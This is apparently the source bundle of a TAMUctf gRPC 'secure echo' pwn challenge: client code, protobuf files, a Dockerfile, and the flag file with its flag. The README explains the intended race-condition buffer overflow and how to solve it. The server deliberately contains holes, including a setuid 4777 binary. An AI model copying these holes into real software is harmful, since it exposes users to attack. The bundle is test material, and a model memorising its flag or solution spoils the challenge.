{
    "README.md": "# Challenge Description\nWe have setup a secure echo service for your needs! To use the service, just download the provided python application and start echoing! It'll ask for a username and password, so please provide those to ensure secure communcations! (Note: this should be arbitrary and not any real username or password)\n\nHint: flag.txt can't be the username, that'd be too easy!\n\npip install grpcio grpcio-tools\n\n# DISCLAIMER\n\nThis challenge was removed from TAMUctf mid-competition.\n\n# Setup\nProvide client/client.py and both client/protobuf_\\*.py files to the user as well as the server/grpc_server.cc source file and server/server.o binary object file.\nRun the following in the server directory:\n\n        sudo docker build -t grpc_pwn .\n\n        sudo docker run --rm -p 3010:3010 grpc_pwn \n\nFor the client side, you should only have to install grpcio/grpcio-tools for python. The protocol buffer is already compiled with the two \\*_pb2.py files, so you should not have to install protobuf.\n\n# Solution\nC++ disassembly is horrying to look at (atleast in Ghidra), sorry.\n\nI have provided a solution script to solve the challenge. The issue exists within the ReceiveEcho function of the grpc server. There is a Time of Check to Time of Use vulnerability that allows the user to modify the contents of a variable after we do a check to make sure it will fit into the buffer it is being copied into. This allows the user to trigger a buffer overflow and overwrite into the next variable on the stack. You can overwrite that variable to read the flag from flag.txt.\n\nWhen it reads the flag from flag.txt, it doesn't simply return that to the client application. Instead, it xor encrypts their message, so they then have to undo the easy xor with known plaintext that they provided.\n\nI included an artificial usleep in there to make it slightly more obvious what needs to be done, as well as make it a little easier to script. The intended solution makes use of two threads: one to trigger the ReceiveEcho, and the other to overwrite the variable during the sleep with an overflow.\n",
    "client\\client.py": "import grpc\nimport argparse\nimport protobuf_pb2\nimport protobuf_pb2_grpc\nimport signal\n\nclass UserLogoutError(Exception):\n    pass\n\ndef signal_handler(signum, frame):\n    raise UserLogoutError('Logging user out')\n\nclass Client:\n    def __init__(self,hname,p,uname):\n        self.hostname = hname\n        self.port = p\n        self.username = uname\n        self.stub = protobuf_pb2_grpc.EchoServiceStub(grpc.insecure_channel(hname+\":\"+p))\n        self.password = ''\n\ndef encrypt(client, message):\n    xored = []\n    temp_pass = client.password\n    for i in range(len(message)):\n        xored_value = ord(message[i%len(message)]) ^ ord(temp_pass[i%len(temp_pass)])\n        xored.append(chr(xored_value))\n    return ''.join(xored)\n\ndef decrypt(client, message):\n    return encrypt(client, message)\n\ndef login(client):\n    response = input(\"You are about to login as user \\\"\" + client.username + \"\\\". Would you like to proceed? (y/n): \")\n    if response[0] == 'n':\n        client.username = input(\"Enter a new username: \")\n    client.password = input(\"Enter a new password: \")\n    reply = client.stub.Login(protobuf_pb2.Request(username=client.username,msg=client.password))\n    print(reply.msg)\n\ndef logout(client):\n    reply = client.stub.Logout(protobuf_pb2.ServiceUser(username=client.username))\n    print('User',client.username,'logging off.')\n\n\ndef echoClient(hostname,port,username):\n    client = Client(hostname, port, username)\n    login(client)\n    signal.signal(signal.SIGINT, signal_handler)\n    try:\n        print(\"Secure Echo Service starting up... Enter \\\"quit\\\" to exit.\")\n        while True:\n            message = input(\"Message: \")\n            if message == 'quit':\n                logout(client)\n                break\n            reply = client.stub.SendEcho(protobuf_pb2.Request(username=client.username,msg=encrypt(client, message)))\n            reply = client.stub.ReceiveEcho(protobuf_pb2.ServiceUser(username=client.username))\n            print(decrypt(client, reply.msg))\n    except UserLogoutError:\n        logout(client)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description=\"Process some arguments\")\n    parser.add_argument('--host',default='localhost')\n    parser.add_argument('-p','--port',default='3010')\n    parser.add_argument('-u','--user',default='default')\n    args = parser.parse_args()\n    echoClient(args.host,args.port,args.user)\n",
    "client\\Makefile": "#\n# Copyright 2015, Google Inc.\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are\n# met:\n#\n#     * Redistributions of source code must retain the above copyright\n# notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above\n# copyright notice, this list of conditions and the following disclaimer\n# in the documentation and/or other materials provided with the\n# distribution.\n#     * Neither the name of Google Inc. nor the names of its\n# contributors may be used to endorse or promote products derived from\n# this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n#\n\nPROTOC = protoc\nGRPC_PYTHON_PLUGIN = grpc_python_plugin\nGRPC_PYTHON_PLUGIN_PATH ?= `which $(GRPC_PYTHON_PLUGIN)`\n\nall: grpc_python_protobuf\n\n.PRECIOUS: %_pb2_grpc.py\n%_pb2_grpc.py: %.proto\n\t$(PROTOC) --grpc_out=. --plugin=protoc-gen-grpc=$(GRPC_PYTHON_PLUGIN_PATH) $<\n\n.PRECIOUS: %_pb2.py\n%_pb2.py: %.proto\n\t$(PROTOC) --python_out=. $<\n\ngrpc_python_protobuf: protobuf_pb2_grpc.py protobuf_pb2.py\n\nclean:\n\trm -rf __pycache__ *_pb2.py *_pb2_grpc.py\n",
    "client\\protobuf.proto": "// Copyright 2015, Google Inc.\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n//     * Redistributions of source code must retain the above copyright\n// notice, this list of conditions and the following disclaimer.\n//     * Redistributions in binary form must reproduce the above\n// copyright notice, this list of conditions and the following disclaimer\n// in the documentation and/or other materials provided with the\n// distribution.\n//     * Neither the name of Google Inc. nor the names of its\n// contributors may be used to endorse or promote products derived from\n// this software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n// \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nsyntax = \"proto3\";\n\npackage tamuctf;\n\nimport \"google/protobuf/timestamp.proto\";\n\n// The messenger service definition.\nservice EchoService{\n  rpc Login (Request) returns (Reply) {}\n  rpc Logout (ServiceUser) returns (Reply) {}\n  rpc SendEcho (Request) returns (Reply) {}\n  rpc ReceiveEcho (ServiceUser) returns (Reply) {}\n}\n\nmessage ServiceUser {\n  string username = 1;\n}\n\nmessage Request {\n  string username = 1;\n  string msg = 2;\n}\n\nmessage Reply {\n  string msg = 1;\n}\n\nmessage Message {\n  //Username who sent the message\n  string username = 1;\n  //Message from the user\n  string msg = 2;\n  //Time the message was sent\n  google.protobuf.Timestamp timestamp = 3;\n}\n",
    "client\\protobuf_pb2.py": "# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: protobuf.proto\n\nimport sys\n_b=sys.version_info[0]<3 and (lambda x:x) or (lambda x:x.encode('latin1'))\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import message as _message\nfrom google.protobuf import reflection as _reflection\nfrom google.protobuf import symbol_database as _symbol_database\nfrom google.protobuf import descriptor_pb2\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\nfrom google.protobuf import timestamp_pb2 as google_dot_protobuf_dot_timestamp__pb2\n\n\nDESCRIPTOR = _descriptor.FileDescriptor(\n  name='protobuf.proto',\n  package='tamuctf',\n  syntax='proto3',\n  serialized_pb=_b('\\n\\x0eprotobuf.proto\\x12\\x07tamuctf\\x1a\\x1fgoogle/protobuf/timestamp.proto\\\"\\x1f\\n\\x0bServiceUser\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\\"(\\n\\x07Request\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\x12\\x0b\\n\\x03msg\\x18\\x02 \\x01(\\t\\\"\\x14\\n\\x05Reply\\x12\\x0b\\n\\x03msg\\x18\\x01 \\x01(\\t\\\"W\\n\\x07Message\\x12\\x10\\n\\x08username\\x18\\x01 \\x01(\\t\\x12\\x0b\\n\\x03msg\\x18\\x02 \\x01(\\t\\x12-\\n\\ttimestamp\\x18\\x03 \\x01(\\x0b\\x32\\x1a.google.protobuf.Timestamp2\\xd3\\x01\\n\\x0b\\x45\\x63hoService\\x12+\\n\\x05Login\\x12\\x10.tamuctf.Request\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12\\x30\\n\\x06Logout\\x12\\x14.tamuctf.ServiceUser\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12.\\n\\x08SendEcho\\x12\\x10.tamuctf.Request\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x12\\x35\\n\\x0bReceiveEcho\\x12\\x14.tamuctf.ServiceUser\\x1a\\x0e.tamuctf.Reply\\\"\\x00\\x62\\x06proto3')\n  ,\n  dependencies=[google_dot_protobuf_dot_timestamp__pb2.DESCRIPTOR,])\n\n\n\n\n_SERVICEUSER = _descriptor.Descriptor(\n  name='ServiceUser',\n  full_name='tamuctf.ServiceUser',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.ServiceUser.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=60,\n  serialized_end=91,\n)\n\n\n_REQUEST = _descriptor.Descriptor(\n  name='Request',\n  full_name='tamuctf.Request',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.Request.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Request.msg', index=1,\n      number=2, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=93,\n  serialized_end=133,\n)\n\n\n_REPLY = _descriptor.Descriptor(\n  name='Reply',\n  full_name='tamuctf.Reply',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Reply.msg', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=135,\n  serialized_end=155,\n)\n\n\n_MESSAGE = _descriptor.Descriptor(\n  name='Message',\n  full_name='tamuctf.Message',\n  filename=None,\n  file=DESCRIPTOR,\n  containing_type=None,\n  fields=[\n    _descriptor.FieldDescriptor(\n      name='username', full_name='tamuctf.Message.username', index=0,\n      number=1, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='msg', full_name='tamuctf.Message.msg', index=1,\n      number=2, type=9, cpp_type=9, label=1,\n      has_default_value=False, default_value=_b(\"\").decode('utf-8'),\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n    _descriptor.FieldDescriptor(\n      name='timestamp', full_name='tamuctf.Message.timestamp', index=2,\n      number=3, type=11, cpp_type=10, label=1,\n      has_default_value=False, default_value=None,\n      message_type=None, enum_type=None, containing_type=None,\n      is_extension=False, extension_scope=None,\n      options=None, file=DESCRIPTOR),\n  ],\n  extensions=[\n  ],\n  nested_types=[],\n  enum_types=[\n  ],\n  options=None,\n  is_extendable=False,\n  syntax='proto3',\n  extension_ranges=[],\n  oneofs=[\n  ],\n  serialized_start=157,\n  serialized_end=244,\n)\n\n_MESSAGE.fields_by_name['timestamp'].message_type = google_dot_protobuf_dot_timestamp__pb2._TIMESTAMP\nDESCRIPTOR.message_types_by_name['ServiceUser'] = _SERVICEUSER\nDESCRIPTOR.message_types_by_name['Request'] = _REQUEST\nDESCRIPTOR.message_types_by_name['Reply'] = _REPLY\nDESCRIPTOR.message_types_by_name['Message'] = _MESSAGE\n_sym_db.RegisterFileDescriptor(DESCRIPTOR)\n\nServiceUser = _reflection.GeneratedProtocolMessageType('ServiceUser', (_message.Message,), dict(\n  DESCRIPTOR = _SERVICEUSER,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.ServiceUser)\n  ))\n_sym_db.RegisterMessage(ServiceUser)\n\nRequest = _reflection.GeneratedProtocolMessageType('Request', (_message.Message,), dict(\n  DESCRIPTOR = _REQUEST,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Request)\n  ))\n_sym_db.RegisterMessage(Request)\n\nReply = _reflection.GeneratedProtocolMessageType('Reply', (_message.Message,), dict(\n  DESCRIPTOR = _REPLY,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Reply)\n  ))\n_sym_db.RegisterMessage(Reply)\n\nMessage = _reflection.GeneratedProtocolMessageType('Message', (_message.Message,), dict(\n  DESCRIPTOR = _MESSAGE,\n  __module__ = 'protobuf_pb2'\n  # @@protoc_insertion_point(class_scope:tamuctf.Message)\n  ))\n_sym_db.RegisterMessage(Message)\n\n\n\n_ECHOSERVICE = _descriptor.ServiceDescriptor(\n  name='EchoService',\n  full_name='tamuctf.EchoService',\n  file=DESCRIPTOR,\n  index=0,\n  options=None,\n  serialized_start=247,\n  serialized_end=458,\n  methods=[\n  _descriptor.MethodDescriptor(\n    name='Login',\n    full_name='tamuctf.EchoService.Login',\n    index=0,\n    containing_service=None,\n    input_type=_REQUEST,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='Logout',\n    full_name='tamuctf.EchoService.Logout',\n    index=1,\n    containing_service=None,\n    input_type=_SERVICEUSER,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='SendEcho',\n    full_name='tamuctf.EchoService.SendEcho',\n    index=2,\n    containing_service=None,\n    input_type=_REQUEST,\n    output_type=_REPLY,\n    options=None,\n  ),\n  _descriptor.MethodDescriptor(\n    name='ReceiveEcho',\n    full_name='tamuctf.EchoService.ReceiveEcho',\n    index=3,\n    containing_service=None,\n    input_type=_SERVICEUSER,\n    output_type=_REPLY,\n    options=None,\n  ),\n])\n_sym_db.RegisterServiceDescriptor(_ECHOSERVICE)\n\nDESCRIPTOR.services_by_name['EchoService'] = _ECHOSERVICE\n\n# @@protoc_insertion_point(module_scope)\n",
    "client\\protobuf_pb2_grpc.py": "# Generated by the gRPC Python protocol compiler plugin. DO NOT EDIT!\nimport grpc\n\nimport protobuf_pb2 as protobuf__pb2\n\n\nclass EchoServiceStub(object):\n  \"\"\"The messenger service definition.\n  \"\"\"\n\n  def __init__(self, channel):\n    \"\"\"Constructor.\n\n    Args:\n      channel: A grpc.Channel.\n    \"\"\"\n    self.Login = channel.unary_unary(\n        '/tamuctf.EchoService/Login',\n        request_serializer=protobuf__pb2.Request.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.Logout = channel.unary_unary(\n        '/tamuctf.EchoService/Logout',\n        request_serializer=protobuf__pb2.ServiceUser.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.SendEcho = channel.unary_unary(\n        '/tamuctf.EchoService/SendEcho',\n        request_serializer=protobuf__pb2.Request.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n    self.ReceiveEcho = channel.unary_unary(\n        '/tamuctf.EchoService/ReceiveEcho',\n        request_serializer=protobuf__pb2.ServiceUser.SerializeToString,\n        response_deserializer=protobuf__pb2.Reply.FromString,\n        )\n\n\nclass EchoServiceServicer(object):\n  \"\"\"The messenger service definition.\n  \"\"\"\n\n  def Login(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def Logout(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def SendEcho(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n  def ReceiveEcho(self, request, context):\n    # missing associated documentation comment in .proto file\n    pass\n    context.set_code(grpc.StatusCode.UNIMPLEMENTED)\n    context.set_details('Method not implemented!')\n    raise NotImplementedError('Method not implemented!')\n\n\ndef add_EchoServiceServicer_to_server(servicer, server):\n  rpc_method_handlers = {\n      'Login': grpc.unary_unary_rpc_method_handler(\n          servicer.Login,\n          request_deserializer=protobuf__pb2.Request.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'Logout': grpc.unary_unary_rpc_method_handler(\n          servicer.Logout,\n          request_deserializer=protobuf__pb2.ServiceUser.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'SendEcho': grpc.unary_unary_rpc_method_handler(\n          servicer.SendEcho,\n          request_deserializer=protobuf__pb2.Request.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n      'ReceiveEcho': grpc.unary_unary_rpc_method_handler(\n          servicer.ReceiveEcho,\n          request_deserializer=protobuf__pb2.ServiceUser.FromString,\n          response_serializer=protobuf__pb2.Reply.SerializeToString,\n      ),\n  }\n  generic_handler = grpc.method_handlers_generic_handler(\n      'tamuctf.EchoService', rpc_method_handlers)\n  server.add_generic_rpc_handlers((generic_handler,))\n",
    "server\\Dockerfile": "# Copyright 2017 gRPC authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nFROM i386/debian:stretch\n\nRUN apt-get update && apt-get install -y \\\n  build-essential autoconf git pkg-config \\\n  automake libtool curl make g++ unzip \\\n  && apt-get clean\n\n# install protobuf first, then grpc\nENV GRPC_RELEASE_TAG v1.10.x\nRUN git clone -b ${GRPC_RELEASE_TAG} https://github.com/grpc/grpc /var/local/git/grpc && \\\n\t\tcd /var/local/git/grpc && \\\n    git submodule update --init && \\\n    echo \"--- installing protobuf ---\" && \\\n    cd third_party/protobuf && \\\n    ./autogen.sh && ./configure --enable-shared && \\\n    make -j$(nproc) && make -j$(nproc) check && make install && make clean && ldconfig && \\\n    echo \"--- installing grpc ---\" && \\\n    cd /var/local/git/grpc && \\\n    make -j$(nproc) && make install && make clean && ldconfig\n\n# build grpc program\nRUN mkdir /pwn\nRUN chmod 777 -R /pwn\nCOPY entry.sh /entry.sh\nCOPY Makefile /pwn/Makefile\nCOPY grpc_server.cc /pwn/grpc_server.cc\nCOPY server.h /pwn/server.h\nCOPY server.cpp /pwn/server.cpp\nCOPY protobuf.proto /pwn/protobuf.proto\nCOPY flag.txt /pwn/flag.txt\n\nRUN echo \"-- building grpc_vuln\" && \\\n    cd /pwn && \\\n    make && \\\n    cd /\n\n# user maintanence\nRUN groupadd ctf\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/grpc_server\n\nRUN chmod 4777 /pwn/grpc_server\nRUN chmod 444 /pwn/flag.txt\nRUN chmod 4755 /entry.sh\n\nEXPOSE 3010\nCMD [\"/entry.sh\"]\n",
    "server\\entry.sh": "#!/bin/bash\nwhile :\ndo\n\tsu -c \"/pwn/grpc_server\" - pwnuser\ndone\n",
    "server\\flag.txt": "gigem{synchr0niz4ati0n_pl5}\n",
    "server\\grpc_server.cc": "/*\n *\n * Copyright 2015, Google Inc.\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *\n *     * Redistributions of source code must retain the above copyright\n * notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n * copyright notice, this list of conditions and the following disclaimer\n * in the documentation and/or other materials provided with the\n * distribution.\n *     * Neither the name of Google Inc. nor the names of its\n * contributors may be used to endorse or promote products derived from\n * this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#include <ctime>\n\n#include <google/protobuf/timestamp.pb.h>\n#include <google/protobuf/duration.pb.h>\n\n#include <stdio.h>\n#include <fstream>\n#include <iostream>\n#include <memory>\n#include <string>\n#include <stdlib.h>\n#include <unistd.h>\n#include <map>\n#include <cstring>\n#include <google/protobuf/util/time_util.h>\n#include <grpc++/grpc++.h>\n\n#include \"protobuf.grpc.pb.h\"\n#include \"server.h\"\n\nusing google::protobuf::Timestamp;\nusing google::protobuf::Duration;\nusing grpc::Server;\nusing grpc::ServerBuilder;\nusing grpc::ServerContext;\nusing grpc::ServerReader;\nusing grpc::ServerReaderWriter;\nusing grpc::ServerWriter;\nusing grpc::Status;\nusing tamuctf::ServiceUser;\nusing tamuctf::Request;\nusing tamuctf::Reply;\nusing tamuctf::EchoService;\n\nclass EchoServiceImpl final : public EchoService::Service {\n    Status Login(ServerContext* context, const Request* request, Reply* reply) override {\n        char* cmsg = login(const_cast<char*>(context->peer().c_str()),const_cast<char*>(request->username().c_str()),const_cast<char*>(request->msg().c_str()));\n        std::string msg(cmsg);\n        free(cmsg);\n        reply->set_msg(msg);\n        return Status::OK;\n    }\n\n    Status Logout(ServerContext* context, const ServiceUser* user, Reply* reply) override {\n        char* cmsg = logout(const_cast<char*>(context->peer().c_str()), const_cast<char*>(user->username().c_str()));\n        std::string msg(cmsg);\n        reply->set_msg(msg);\n        return Status::OK;\n    }\n\n    Status SendEcho(ServerContext* context, const Request* request, Reply* reply) override {\n        char* cmsg = sendEcho(const_cast<char*>(context->peer().c_str()), const_cast<char*>(request->username().c_str()), const_cast<char*>(request->msg().c_str()));\n        std::string msg(cmsg);\n        reply->set_msg(msg);\n        return Status::OK;\n    }\n\n    Status ReceiveEcho(ServerContext* context, const ServiceUser* user, Reply* reply) override {\n        char* cmsg = receiveEcho(const_cast<char*>(context->peer().c_str()), const_cast<char*>(user->username().c_str()));\n        std::string msg(cmsg);\n        free(cmsg);\n        reply->set_msg(msg);\n        return Status::OK;\n    }\n};\n\nvoid RunServer(std::string port_no) {\n  std::string server_address = \"0.0.0.0:\"+port_no;\n  EchoServiceImpl service;\n\n  ServerBuilder builder;\n  builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());\n  builder.RegisterService(&service);\n  std::unique_ptr<Server> server(builder.BuildAndStart());\n  std::cout << \"Server listening on \" << server_address << std::endl;\n\n  server->Wait();\n}\n\nint main(int argc, char** argv) {\n  \n  std::string port = \"3010\";\n  int opt = 0;\n  while ((opt = getopt(argc, argv, \"p:\")) != -1){\n    switch(opt) {\n      case 'p':\n          port = optarg;break;\n      default:\n\t  std::cerr << \"Invalid Command Line Argument\\n\";\n    }\n  }\n  RunServer(port);\n\n  return 0;\n}\n",
    "server\\Makefile": "#\n# Copyright 2015, Google Inc.\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are\n# met:\n#\n#     * Redistributions of source code must retain the above copyright\n# notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above\n# copyright notice, this list of conditions and the following disclaimer\n# in the documentation and/or other materials provided with the\n# distribution.\n#     * Neither the name of Google Inc. nor the names of its\n# contributors may be used to endorse or promote products derived from\n# this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n#\n\nHOST_SYSTEM = $(shell uname | cut -f 1 -d_)\nSYSTEM ?= $(HOST_SYSTEM)\nCXX = g++\nCPPFLAGS += -I/usr/local/include -pthread\nCXXFLAGS += -std=c++11\nifeq ($(SYSTEM),Darwin)\nLDFLAGS += -L/usr/local/lib `pkg-config --libs protobuf grpc++ grpc`\\\n           -lgrpc++_reflection\\\n           -ldl\nelse\nLDFLAGS += -L/usr/local/lib `pkg-config --libs protobuf grpc++ grpc`\\\n           -Wl,--no-as-needed -lgrpc++_reflection -Wl,--as-needed\\\n           -ldl\nendif\nPROTOC = protoc\nGRPC_CPP_PLUGIN = grpc_cpp_plugin\nGRPC_CPP_PLUGIN_PATH ?= `which $(GRPC_CPP_PLUGIN)`\n\nall: server.o grpc_server\n\n.PRECIOUS: %.grpc.pb.cc\n%.grpc.pb.cc: %.proto\n\t$(PROTOC) --grpc_out=. --plugin=protoc-gen-grpc=$(GRPC_CPP_PLUGIN_PATH) $<\n\n.PRECIOUS: %.pb.cc\n%.pb.cc: %.proto\n\t$(PROTOC) --cpp_out=. 